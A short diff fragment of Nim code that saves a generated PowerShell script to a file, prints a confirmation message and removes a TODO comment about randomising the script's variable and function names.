+            writeFile(fmt"{outfile}.ps1", script)
+            echo fmt"[!] Powershell script saved to {outfile}.ps1"
+            psout = false
+
+
     if(psout):
         WritePS1()
         echo "\r\nPowershell script saved to: " & fmt"{outfile}.ps1"
-        # Todo: Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on
-
+      
 
 
 
